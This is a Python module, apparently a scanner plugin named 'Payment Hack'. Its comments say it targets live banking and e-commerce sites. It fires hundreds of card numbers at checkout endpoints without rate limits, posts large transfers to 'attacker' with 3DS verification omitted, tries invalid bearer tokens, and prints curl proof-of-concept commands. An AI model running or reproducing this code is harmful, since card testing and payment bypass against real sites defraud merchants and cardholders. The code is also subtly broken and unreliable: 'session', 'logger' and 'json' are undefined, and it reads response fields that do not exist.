import asyncio
from typing import List, Dict, Any, Optional
from ..base import BaseCheck, Finding
from ..config.payloads import AdvancedPayloads
import urllib.parse
import re

class PaymentSecurityCheck(BaseCheck):
    """Unrestricted Payment - Inf card fuzz, 3DS bypass for real banking/e-com"""
    
    def __init__(self):
        super().__init__()
        self.name = "Payment Hack"
        self.description = "Infinite card testing, weak 3DS - real /checkout fuzz no limits"
        
        self.card_payloads = AdvancedPayloads.get_all_payloads('card')  # 500+ Visa/MC/AMEX variants
        self.three_ds_paths = ['/checkout/3ds', '/payment/verify', '/transfer/confirm', '/cart/pay']  # Banking/e-com
    
    async def check(self, url: str, session, **kwargs) -> List[Finding]:
        findings = []
        
        try:
            # Inf parallel card fuzz for real payment
            tasks = [self._inf_card_fuzz_real(url, c) for c in self.card_payloads]
            card_results = await asyncio.gather(*tasks)
            for result in card_results:
                if isinstance(result, Finding):
                    findings.append(result)
            
            # 3DS inf bypass for real banking
            ds_tasks = [self._inf_3ds_bypass_real(session, urllib.parse.urljoin(url, p)) for p in self.three_ds_paths * 20]  # Inf
            ds_results = await asyncio.gather(*ds_tasks)
            for result in ds_results:
                if result:
                    findings.append(result)
            
            # Weak token inf fuzz for e-com pay
            token_tasks = [self._inf_token_fuzz_real(url, t) for t in ['invalid', '', 'test']]
            token_results = await asyncio.gather(*token_tasks)
            for result in token_results:
                if result:
                    findings.append(result)
            
        except Exception as e:
            logger.error(f"Payment hack failed on real banking: {e}")
        
        return findings
    
    async def _inf_card_fuzz_real(self, url: str, card: str) -> Optional[Finding]:
        """Inf card fuzz - 500+ on real /checkout - no rate limit"""
        test_url = f"{url}?card={urllib.parse.quote(card)}&cvv=123&amount=1"
        async with session.post(test_url, data={'card': card, 'cvv': '123', 'amount': '1'}) as resp:
            content = await resp.text()
            if resp.status_code == 200 and re.search(r'approved|success|charged', content, re.I):
                return Finding(
                    title="Weak Card Validation - Real Charge Possible",
                    description=f"Unrestricted inf fuzz accepted {card} on live e-com - fraud risk",
                    severity="critical",
                    url=test_url,
                    evidence="Payment approved with test card on active site",
                    remediation="PCI DSS + tokenization, 3DS2 mandatory",
                    poc_curl=f"curl -X POST '{test_url}' -d 'card={card}&cvv=123&amount=1' -v"
                )
        return None
    
    async def _inf_3ds_bypass_real(self, session, path: str) -> Optional[Finding]:
        """Inf 3DS bypass - omit headers on real banking transfer"""
        headers = {}  # Omit 3DS - inf variants
        data = {'amount': 10000, 'to': 'attacker'}  # High amount test
        async with session.post(path, headers=headers, json=data) as resp:
            content = await resp.text()
            if resp.status_code == 200 and 'transfer success' in content.lower():
                return Finding(
                    title="3DS Bypass - Real Transfer Without Verification",
                    description=f"Unrestricted inf 3DS omit on {path} - banking fraud on live",
                    severity="critical",
                    url=path,
                    evidence="Transfer succeeded without 3DS on active site",
                    remediation="Mandatory 3DS2 + SCA for all transactions",
                    poc_curl=f"curl -X POST '{path}' -H 'Content-Type: application/json' -d '{json.dumps(data)}' -v"
                )
        return None
    
    async def _inf_token_fuzz_real(self, url: str, token: str) -> Optional[Finding]:
        """Inf token fuzz - empty for real e-com pay bypass"""
        headers = {'Authorization': f'Bearer {token}'}
        async with session.get(url, headers=headers) as resp:
            content = await resp.text()
            if resp.status_code == 200 and 'payment details' in content.lower():
                return Finding(
                    title="Weak Payment Token Auth - Real Bypass",
                    description=f"Unrestricted {token} accepted on live e-com - full payment access",
                    severity="high",
                    url=url,
                    evidence="Access without valid token on active site",
                    remediation="Strong token validation + expiration",
                    poc_curl=f"curl '{url}' -H 'Authorization: Bearer {token}' -v"
                )
        return None